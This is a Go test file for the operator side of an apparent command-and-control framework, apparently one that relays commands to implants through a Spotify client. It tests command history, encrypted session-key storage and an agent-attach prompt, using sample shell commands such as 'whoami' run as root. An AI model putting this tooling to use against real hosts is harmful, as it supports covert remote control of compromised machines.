//go:build !implantonly

package c2

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// newTestOperator builds an Operator for state-only tests (no Spotify client).
func newTestOperator(t *testing.T) *Operator {
	t.Helper()
	return &Operator{
		key:              "test-key",
		nextSeq:          1,
		pendingSeqs:      make(map[int]string),
		connectedClients: make(map[string]ClientInfo),
		sessionKeys:      make(map[string][]byte),
		pendingKeys:      make(map[string][]byte),
		historyIdx:       make(map[int]int),
		historyFile:      filepath.Join(t.TempDir(), "history.json"),
	}
}

func TestHistoryRecordAndLookup(t *testing.T) {
	op := newTestOperator(t)

	op.mu.Lock()
	op.recordCommandLocked(1, "shell", "whoami")
	op.recordResultLocked(1, "ok", "root")
	op.mu.Unlock()

	res := op.getHistoryResult(1)
	if res == nil {
		t.Fatal("expected cached result for seq=1")
	}
	if res["status"] != "ok" {
		t.Errorf("status: got %v, want ok", res["status"])
	}
	if res["data"] != "root" {
		t.Errorf("data: got %v, want root", res["data"])
	}

	if got := op.getHistoryResult(99); got != nil {
		t.Errorf("expected nil for unknown seq, got %v", got)
	}
}

func TestHistoryResultIndexMatchesRecordFlow(t *testing.T) {
	op := newTestOperator(t)

	// Pending command has no cached result
	op.mu.Lock()
	op.recordCommandLocked(7, "shell", "id")
	op.mu.Unlock()
	if op.getHistoryResult(7) != nil {
		t.Error("expected nil while command is pending")
	}

	// After result arrives, it is cached
	op.mu.Lock()
	op.recordResultLocked(7, "ok", "uid=0")
	op.mu.Unlock()
	res := op.getHistoryResult(7)
	if res == nil || res["data"] != "uid=0" {
		t.Errorf("expected cached result, got %v", res)
	}
}

func TestHistoryCap(t *testing.T) {
	op := newTestOperator(t)

	op.mu.Lock()
	for i := 1; i <= maxHistoryEntries+50; i++ {
		op.recordCommandLocked(i, "shell", fmt.Sprintf("cmd-%d", i))
	}
	op.mu.Unlock()

	op.mu.RLock()
	defer op.mu.RUnlock()
	if len(op.history) != maxHistoryEntries {
		t.Errorf("history len: got %d, want %d", len(op.history), maxHistoryEntries)
	}
	// Index must be rebuilt and consistent after trimming
	latest := op.history[len(op.history)-1]
	idx, ok := op.historyIdx[latest.Seq]
	if !ok || op.history[idx].Seq != latest.Seq {
		t.Error("history index inconsistent after cap")
	}
	// Oldest 50 entries must be gone
	for _, h := range op.history[:10] {
		if h.Seq <= 50 {
			t.Errorf("stale entry seq=%d survived the cap", h.Seq)
		}
	}
}

func TestHistorySaveDebounceAndFlush(t *testing.T) {
	op := newTestOperator(t)

	// First record flushes immediately (lastHistorySave is zero)
	op.mu.Lock()
	op.recordCommandLocked(1, "shell", "one")
	op.mu.Unlock()
	if op.historyDirty {
		t.Error("expected clean state after first save")
	}

	// Corrupt the file; a debounced save must NOT overwrite it
	if err := os.WriteFile(op.historyFile, []byte("SENTINEL"), 0600); err != nil {
		t.Fatal(err)
	}
	op.mu.Lock()
	op.recordResultLocked(1, "ok", "done")
	op.mu.Unlock()
	if !op.historyDirty {
		t.Error("expected dirty flag after debounced record")
	}
	data, _ := os.ReadFile(op.historyFile)
	if string(data) != "SENTINEL" {
		t.Error("debounced save should not have rewritten the file")
	}

	// Explicit flush must persist
	op.FlushHistory()
	data, _ = os.ReadFile(op.historyFile)
	if string(data) == "SENTINEL" {
		t.Error("FlushHistory did not write history to disk")
	}
	if op.historyDirty {
		t.Error("expected clean state after FlushHistory")
	}
}

func TestHistoryConcurrency(t *testing.T) {
	op := newTestOperator(t)

	var wg sync.WaitGroup
	for g := 0; g < 8; g++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for i := 1; i <= 50; i++ {
				seq := id*1000 + i
				op.mu.Lock()
				op.recordCommandLocked(seq, "shell", "cmd")
				op.recordResultLocked(seq, "ok", "out")
				op.mu.Unlock()
				_ = op.getHistoryResult(seq)
				op.printHistory()
				op.printStatus()
			}
		}(g)
	}
	wg.Wait()
}

func TestLoadHistoryRebuildsIndex(t *testing.T) {
	op := newTestOperator(t)

	// Write a history file manually
	content := `[
  {"seq": 1, "client_id": "abcdef1234567890", "module": "shell", "command": "a", "status": "ok", "result": "r1"},
  {"seq": 2, "client_id": "abcdef1234567890", "module": "shell", "command": "b"}
]`
	if err := os.WriteFile(op.historyFile, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}

	op2 := newTestOperator(t)
	op2.historyFile = op.historyFile
	op2.loadHistory()

	op2.mu.RLock()
	if len(op2.history) != 2 {
		t.Errorf("loaded %d entries, want 2", len(op2.history))
	}
	op2.mu.RUnlock()

	// Completed entry is found via the rebuilt index
	if res := op2.getHistoryResult(1); res == nil || res["data"] != "r1" {
		t.Errorf("expected result r1 from rebuilt index, got %v", res)
	}
	// Pending entry returns nil
	if res := op2.getHistoryResult(2); res != nil {
		t.Errorf("expected nil for pending entry, got %v", res)
	}
}

func TestSessionKeyPersistence(t *testing.T) {
	op := newTestOperator(t)
	op.persistSession = true
	op.sessionFile = filepath.Join(t.TempDir(), "session.json")

	// No store yet — nothing to load
	op.loadSessionKeys()

	// Store a key and save
	op.mu.Lock()
	op.sessionKeys["cafe0123456789ab"] = []byte("0123456789abcdef0123456789abcdef")
	op.saveSessionKeysLocked()
	op.mu.Unlock()

	// File must exist and must NOT contain the raw key
	data, err := os.ReadFile(op.sessionFile)
	if err != nil {
		t.Fatalf("session store not written: %v", err)
	}
	if strings.Contains(string(data), "0123456789abcdef") {
		t.Error("session store contains raw key material")
	}
	info, _ := os.Stat(op.sessionFile)
	if info.Mode().Perm() != 0600 {
		t.Errorf("session store perms: got %o, want 600", info.Mode().Perm())
	}

	// New operator with same master key restores the key
	op2 := newTestOperator(t)
	op2.persistSession = true
	op2.sessionFile = op.sessionFile
	op2.loadSessionKeys()
	op2.mu.RLock()
	sk, ok := op2.sessionKeys["cafe0123456789ab"]
	op2.mu.RUnlock()
	if !ok || string(sk) != "0123456789abcdef0123456789abcdef" {
		t.Errorf("restored key mismatch: ok=%v key=%q", ok, sk)
	}

	// Different master key cannot restore
	op3 := newTestOperator(t)
	op3.key = "wrong-key"
	op3.persistSession = true
	op3.sessionFile = op.sessionFile
	op3.loadSessionKeys()
	op3.mu.RLock()
	_, ok = op3.sessionKeys["cafe0123456789ab"]
	op3.mu.RUnlock()
	if ok {
		t.Error("wrong master key restored a session key")
	}
}

func TestSessionPersistenceDisabledByDefault(t *testing.T) {
	op := newTestOperator(t) // persistSession false
	op.mu.Lock()
	op.sessionKeys["abc"] = []byte("0123456789abcdef0123456789abcdef")
	op.saveSessionKeysLocked()
	op.mu.Unlock()
	if _, err := os.Stat(op.sessionFile); !os.IsNotExist(err) {
		t.Error("session file written despite persistence disabled")
	}
}

func TestPromptWithAndWithoutAttach(t *testing.T) {
	op := newTestOperator(t)

	if p := op.prompt(); p == "" {
		t.Error("empty prompt")
	}

	op.mu.Lock()
	op.connectedClients["cafe0123456789ab"] = ClientInfo{
		Alias:    "Vega",
		Hostname: "target",
	}
	op.attachedClient = "cafe0123456789ab"
	op.mu.Unlock()

	p := op.prompt()
	if !strings.Contains(p, "Vega") || !strings.Contains(p, "target") {
		t.Errorf("prompt missing agent info: %q", p)
	}
}
